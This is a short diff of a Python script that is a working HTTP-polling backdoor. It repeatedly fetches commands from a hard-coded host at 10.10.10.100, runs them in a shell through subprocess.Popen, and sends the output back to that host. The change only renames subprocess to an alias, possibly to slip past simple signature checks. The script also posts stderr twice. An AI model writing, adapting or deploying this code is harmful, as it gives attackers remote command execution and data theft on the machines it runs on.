@@ -4,6 +4,7 @@ import os
 import time
 
 while True:
+    sp = subprocess
     req = requests.get('http://10.10.10.100')
     command = req.text
     if 'terminate' in command:
@@ -17,7 +18,7 @@ while True:
         else:
             post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file!')
     else:
-        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        CMD = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
         post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read())
         post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read())
 time.sleep(3)
